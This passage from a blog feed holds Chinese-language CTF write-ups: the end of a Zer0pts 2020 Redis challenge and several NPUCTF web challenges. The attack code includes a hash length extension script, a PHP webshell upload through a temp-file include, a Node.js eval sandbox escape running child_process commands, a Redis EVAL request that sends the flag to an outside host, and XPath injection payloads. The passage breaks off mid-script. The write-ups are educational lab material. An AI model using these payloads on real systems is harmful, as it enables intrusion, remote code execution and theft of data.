BGREWRITEAOF &quot;&quot;</span><br><span class="line">rename-command INFO &quot;&quot;</span><br><span class="line">rename-command MONITOR &quot;&quot;</span><br><span class="line">rename-command SLAVEOF &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command CLIENT &quot;&quot;</span><br><span class="line">rename-command CLUSTER &quot;&quot;</span><br><span class="line">rename-command DEBUG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">rename-command EVALSHA &quot;&quot;</span><br><span class="line">rename-command PSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBSUB &quot;&quot;</span><br><span class="line">rename-command READONLY &quot;&quot;</span><br><span class="line">rename-command READWRITE &quot;&quot;</span><br><span class="line">rename-command SCRIPT &quot;&quot;</span><br><span class="line">rename-command REPLICAOF &quot;&quot;</span><br><span class="line">rename-command SYNC &quot;&quot;</span><br><span class="line">rename-command PSYNC &quot;&quot;</span><br><span class="line">rename-command WAIT &quot;&quot;</span><br><span class="line">rename-command LATENCY &quot;&quot;</span><br><span class="line">rename-command MEMORY &quot;&quot;</span><br><span class="line">rename-command MODULE &quot;&quot;</span><br><span class="line">rename-command MIGRATE &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>然后在redis的配置文件里禁了上面的命令，理清代码逻辑后我们可以清楚我们的攻击思路，其实就是通过获取redis数据库中键为flag对应的值。</p>
<ul>
<li>方法一</li>
</ul>
<p>通过BITOP<a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">命令</a>和BITFIELD<a href="https://redis.io/commands/bitfield" target="_blank" rel="noopener">命令</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br></pre></td></tr></table></figure>

<p>这样设置，然后访问q=2f2f2f2f2f2f2f2b，返回404，然后查找原因得知</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
<p>是这里redirect的原因，然后参考</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141636854.png" alt="image-20200501141636854"></p>
<p>这里，需要把url变成带有?的链接。</p>
<p>BITFIELD命令可以设置指定位域的值。</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141937654.png" alt="image-20200501141937654" style="zoom:150%;">

<p>可以设置任意位。</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140017042.png" alt="image-20200501140017042"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br><span class="line">BITFIELD 2f2f2f2f2f2f2f2b SET u8 #4 63</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140158217.png" alt="image-20200501140158217"></p>
<ul>
<li>方法二</li>
</ul>
<p>通过BITOP命令和SETBIT<a href="https://redis.io/commands/setbit" target="_blank" rel="noopener">命令</a></p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140628667.png" alt="image-20200501140628667" style="zoom:200%;">

<p>flag{}与1异或第一位为W</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">W	0101 0111</span><br><span class="line">? 	0011 1111</span><br><span class="line">需要修改 第 1、2、4位。</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140342693.png" alt="image-20200501140342693"></p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142107776.png" alt="image-20200501142107776"></p>
<ul>
<li>方法三</li>
</ul>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142904135.png" alt="image-20200501142904135" style="zoom:150%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Request 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;rwx.kr</span><br><span class="line">eval &quot;redis.call(&#39;set&#39;,&#39;e41cf0f94e050661&#39;,&#39;http:&#x2F;&#x2F;rwx.kr?&#39;..redis.call(&#39;get&#39;,&#39;flag&#39;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Request 2</span><br><span class="line">GET &#x2F;?q&#x3D;e41cf0f94e050661 HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Location: http:&#x2F;&#x2F;rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Xss-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick&#x2F;1.6.0 (Ruby&#x2F;2.7.0&#x2F;2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a>未复现成功</p>
</blockquote>
<p>参考：</p>
<p><a href="https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp" target="_blank" rel="noopener">https://blog.rwx.kr/zer0pts-CTF-2020/#435pts-urlapp</a></p>
<p><a href="https://www.anquanke.com/post/id/200927#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927#h3-4</a></p>
<p><a href="https://gitlab.com/zer0pts/zer0pts-ctf-2020/" target="_blank" rel="noopener">https://gitlab.com/zer0pts/zer0pts-ctf-2020/</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF_WP</title>
    <url>/2020/04/26/NPUCTF-WP/</url>
    <content><![CDATA[<p>记录几道NPUCTF比赛WP</p>
<a id="more"></a>

<h1 id="0x01-ezinclude"><a href="#0x01-ezinclude" class="headerlink" title="0x01 ezinclude"></a>0x01 ezinclude</h1><p>首先访问可以得到</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426095958737.png" alt="image-20200426095958737"></p>
<p>然后看到cookie有hash</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101145987.png" alt="image-20200426101145987"></p>
<p>感觉这个hash值就应该是$pass，测试发现它回根据传入的name值变化，然后?name=mount4in，后hash刷新成上面的hash值，然后就可绕过，</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101420611.png" alt="image-20200426101420611"></p>
<p>看官方WP考点是hash扩展攻击，hash扩展攻击的利用条件就是密钥在前面，已知一对明文密文对。然后可以利用hashpump进行伪造其他明文对应的密文。这里我们不知道密钥的长度，所以去爆破密钥长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/index.php?'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">'5134d395cb21ac79b18b2d7b8d517630'</span>,<span class="string">'admin123'</span>,<span class="string">'1'</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="comment">#print(req.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username/password error'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(i)</span><br><span class="line">        print(req.text,url+<span class="string">"name=&#123;&#125;&amp;pass=&#123;&#125;"</span>.format(urllib.parse.quote(b),a))</span><br></pre></td></tr></table></figure>

<p>然后会跳转到flflflflag.php，这里浏览器直接访问会跳到404界面，这里用burp去访问，</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426101637325.png" alt="image-20200426101637325"></p>
<p>有一个文件包含，这里我们可以利用伪协议读下源码，看下index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">@$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script language="javascript" type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">           window.location.href="flflflflag.php";</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">"Hash"</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"username/password error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">'%^$&amp;$#fffdflag_is_not_here_ha_ha'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>dir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">"javascript"</span> type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">"404.html"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/data|input|zip/is'</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include($_GET["file"])'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这里有个dir.php可以查看/tmp目录的文件，那么应该是对临时文件的利用了，之前有大佬分析过在使用php://filter/string.strip_tags/resource=/etc/passwd这个过滤器时，php会发生错误，导致上传的临时文件不会被删除，一直保存在/tmp目录，然后利用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.session()</span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">url= <span class="string">'http://96a4287d-e8a9-469d-bc19-fe91cd56b249.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">	<span class="string">"demo"</span>:(<span class="string">"test.jpg"</span>,<span class="string">"&lt;?php eval($_POST[1]);?&gt;"</span>,<span class="string">"image/jpeg"</span>),</span><br><span class="line">	<span class="string">"submit"</span>:(<span class="literal">None</span>,<span class="string">"submit"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url,proxies=proxy,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>传完之后，访问dir.php可以得到临时文件的名，然后包含就可以得到webshell。然后flag在phpinfo()里面</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426102656589.png" alt="image-20200426102656589"></p>
<h1 id="0x02-验证🐎"><a href="#0x02-验证🐎" class="headerlink" title="0x02 验证🐎"></a>0x02 验证🐎</h1><p>可以得到源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到关键点在</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426103241744.png" alt="image-20200426103241744"></p>
<p>从输入中获取e、first、second，如果通过</p>
<p><code>(first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]))</code>这个条件而且e存在就调用saferEval()处理。</p>
<p>首先这个条件要求first和second长度相等、first不等于second、first和second拼接一个值后的md5相等。这个之前有个比赛考过，具体链接找不到了，因为js也是一个弱类型的语言，first和second在与keys[0]拼接时会强制转换成字符串，而且String和Array都有length属性。</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426104545707.png" alt="image-20200426104545707" style="zoom:150%;">

<p>然后就是对saferEval()的绕过，</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426105112573.png" alt="image-20200426105112573" style="zoom:150%;">

<p>可以看到这个过滤会替换正则表达式的内容为空，若替换后为空，则执行eval；若不为空返回null。分析下正则表达式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)|[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span></span><br><span class="line">(?:Math(?:<span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">w</span></span>+)?)</span><br><span class="line">:匹配Math后面加字母数字下划线或.   如：Math.constructor后面只能0次或1次</span><br><span class="line">[()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:]</span></span><br><span class="line">:匹配()+<span class="tag">\<span class="name">-</span></span>*/&amp;|^<span class="comment">%&lt;&gt;=,?:   这些字符</span></span><br><span class="line">(?:<span class="tag">\<span class="name">d</span></span>+<span class="tag">\<span class="name">.</span></span>?<span class="tag">\<span class="name">d*</span></span>(?:e<span class="tag">\<span class="name">d</span></span>+)?)</span><br><span class="line">:匹配数字  如：122.122</span><br><span class="line">后面应该还有一个空格</span><br></pre></td></tr></table></figure>

<p>这里可以用到<code>=&gt;</code>这个符号，来生成匿名函数，并且在后面加上参数可以立即调用。</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426113154558.png" alt="image-20200426113154558" style="zoom:150%;">

<p>这里先贴出payload，然后再分析。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.x=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>最后传给eval执行的应该是一个表达式字符串，如alert(1)这种形式。正则表达式只允许在Math后面加字母字符，查看对应的Math的函数没有能够将数字转换成字母的（这里不像php，php里面有很多可以尽心进制转换的函数），但是String.fromCharCode()这个函数可以将ascii码转换成字符，然后就通过原型获得String。</p>
<p><img src="/2020/04/26/NPUCTF-WP/image-20200426120922034.png" alt="image-20200426120922034"></p>
<p>如上图所示我们需要获得Function和String，</p>
<img src="/2020/04/26/NPUCTF-WP/image-20200426121147768.png" alt="image-20200426121147768" style="zoom:150%;">

<p>Math+1会因为Object与字符串拼接后原型会变成String，然后String的constructor为Function，这样就得到了需要的东西，进行替换就好。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))()</span><br><span class="line"></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor				======&gt;&gt;<span class="built_in">String</span></span><br><span class="line">(<span class="built_in">Math</span>+<span class="number">1</span>).constructor.constructor	======&gt;&gt;<span class="built_in">Function</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()))(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们将下面的payload编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"return process.mainModule.require('child_process').execSync('cat /flag')"</span>)+<span class="string">")"</span></span><br><span class="line"><span class="comment">#return process.mainModule.require('child_process').execSync('cat /flag')</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"first"</span>:<span class="string">"1"</span>,<span class="attr">"second"</span>:[<span class="number">1</span>],<span class="attr">"e"</span>:<span class="string">"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/26/NPUCTF-WP/image-20200426122851092.png" alt="image-20200426122851092"></p>
<h1 id="0x03-ezlogin"><a href="#0x03-ezlogin" class="headerlink" title="0x03 ezlogin"></a>0x03 ezlogin</h1><p>xpath注入</p>
<blockquote>
<p>查询语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query &#x3D; &quot;&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;</span><br></pre></td></tr></table></figure>

<p>1.万能密码，这点和SQL很像；在知道用户名的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>在不知道用户名的情况，使用两个or绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;fake&#39; or &#39;1&#39;or&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>2.使用<code>|</code>操作符，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39;]|&#x2F;&#x2F;*|ss[&#39;&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>其执行的语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;root&#x2F;accounts&#x2F;user[username&#x2F;text()&#x3D;&#39;1&#39; ]|&#x2F;&#x2F;*|ss[&#39;&#39; and password&#x2F;text()&#x3D;&#39;1&#39;]</span><br></pre></td></tr></table></figure>

<p>即先闭合前面的语句，之后<code>//*</code>列出文档所有元素</p>
<p>3.盲注，需要一级一级猜解节点；猜解第一级节点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;r&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>猜解第二级节点数量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or count(&#x2F;root&#x2F;*)&#x3D;2 or &#39;1&#39;&#x3D;&#39;1&amp;fake</span><br></pre></td></tr></table></figure>

<p>猜解第二级节点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(name(&#x2F;root&#x2F;*[position()&#x3D;1]),1,1)&#x3D;&#39;u&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>

<p>猜解id为1的user节点下的username值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;1&#39; or substring(&#x2F;root&#x2F;users&#x2F;user[id&#x3D;1]&#x2F;username,1,1)&#x3D;&#39;a&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pwd&#x3D;fake</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://a1de621a-25c0-4bb0-b867-649ffc93c5f0.node3.buuoj.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span 